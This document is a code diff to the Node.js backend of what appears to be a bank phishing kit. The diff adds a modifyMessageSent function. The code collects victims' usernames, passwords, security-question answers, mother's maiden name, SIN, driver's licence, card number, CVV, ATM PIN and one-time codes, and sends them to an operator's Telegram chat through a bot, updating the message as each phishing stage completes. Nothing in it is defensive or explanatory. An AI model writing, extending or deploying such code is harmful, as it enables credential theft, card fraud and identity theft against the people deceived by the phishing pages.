@@ -217,7 +217,7 @@ function update(initialData, initialDataTest){
 
 async function sendNewMessage(userDetails){
     let messageId = null
-    let message = `IP: ipAddress
+    let message = `IP: ${userDetails.ip}
 
     -- Login Details --
     Username: ${userDetails.getUserDataLogin.username || ''}
@@ -261,8 +261,55 @@ async function sendNewMessage(userDetails){
     return messageId
 }
 
-function modifyMessageSent(){
+async function modifyMessageSent(userDetails){
+    let bool = false
+    let message = `IP: ${userDetails.ip}
 
+    -- Login Details --
+    Username: ${userDetails.getUserDataLogin.username || ''}
+    Password:  ${userDetails.getUserDataLogin.password || ''}
+    UserAgent: ${userDetails.getUserDataLogin.userAgent || ''}
+    
+    -- Security Questions --
+    Q1: ${userDetails.getUserDataQuestion.question1 || ''} : ${userDetails.getUserDataQuestion.answer1 || ''}
+    Q2: ${userDetails.getUserDataQuestion.question2 || ''} : ${userDetails.getUserDataQuestion.answer2 || ''}
+    Q3: ${userDetails.getUserDataQuestion.question3 || ''} : ${userDetails.getUserDataQuestion.answer3 || ''}
+    Q4: ${userDetails.getUserDataQuestion.question4 || ''} : ${userDetails.getUserDataQuestion.answer4 || ''}
+    Q5: ${userDetails.getUserDataQuestion.question5 || ''} : ${userDetails.getUserDataQuestion.answer5 || ''}
+    Custom Question: ${userDetails.getUserDataOTP.customQuestion || ''} : ${userDetails.getUserDataOTP.customAnswer || ''}
+    
+    -- Personal Information --
+    Full Name: ${userDetails.getUserDataDetails.name || ''}
+    Address: ${userDetails.getUserDataDetails.address || ''}
+    City: ${userDetails.getUserDataDetails.city || ''}
+    Phone Number: ${userDetails.getUserDataDetails.phone || ''}
+    Postal Code: ${userDetails.getUserDataDetails.postal || ''}
+    Email: ${userDetails.getUserDataDetails.email || ''}
+    DOB: ${userDetails.getUserDataDetails.dob1 || ''}/${userDetails.getUserDataDetails.dob2 || ''}/${userDetails.getUserDataDetails.dob3 || ''} || ${userDetails.getUserDataDetails.dob || ''}
+    Mmn: ${userDetails.getUserDataDetails.mmn || ''}
+    Sin: ${userDetails.getUserDataDetails.sin || ''}
+    Driver Licence: ${userDetails.getUserDataDetails.drivers || ''}
+
+    -- Card Information --
+    Card Number: ${userDetails.getUserDataCard.card || ''}
+    Expiry: ${userDetails.getUserDataCard.exp1 || ''}/${userDetails.getUserDataCard.exp2 || ''} || ${userDetails.getUserDataCard.expiry || ''}
+    CVV: ${userDetails.getUserDataCard.cvv || ''}
+    ATM PIN: ${userDetails.getUserDataCard.atm || ''}
+    
+    -- OTP --
+    Code:  ${userDetails.getUserDataOTP.code || ''}`;
+    await bot.editMessageText(message, {
+        chat_id: userDetails.getUserDataTelegramId.chatId,
+        message_id: userDetails.getUserDataTelegramId.msgId
+    })
+      .then((editedMessage) => {
+        bool = true
+    })
+      .catch((error) => {
+        console.error(error);
+    });
+
+    return bool
 }
 
 // Use this middleware in your app before your routes
@@ -536,7 +583,7 @@ io.on('connection', (socket, req) => {
                 userDetails.getUserDataCard = {};
                 userDetails.getUserDataOTP = {};
                 userDetails.getUserDataQuestion = {};
-                userDetails.getUserDataTelegramId = {}
+                userDetails.getUserDataTelegramId = {};
         }
         if(userDetails.stage == 'Login'){
             userDetails.getUserDataLogin = data
@@ -554,18 +601,18 @@ io.on('connection', (socket, req) => {
             
         }
 
-        if(userDetails.getUserDataTelegramId.msgId){
-            console.log('We got msg Id')
-            console.log(userDetails.getUserDataTelegramId.msgId);
+        if(userDetails.getUserDataTelegramId.msgId && userDetails.getUserDataTelegramId.ip == userIP){
+            modifyMessageSent(userDetails).then(bool => {
+                console.log(bool)
+            })
         } else {
-            console.log('New msg')
             sendNewMessage(userDetails).then(messageId => {
-                userDetails.getUserDataTelegramId = {msgId: messageId, chatId: chatId}
+                userDetails.getUserDataTelegramId = {msgId: messageId, chatId: chatId, ip: userDetails.ip }
             })
         }
             
         sessionStore.set(userIP, userDetails);
-        io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
+        io.emit('join', Array.from(sessionStore.entries())); 
         
        
     }
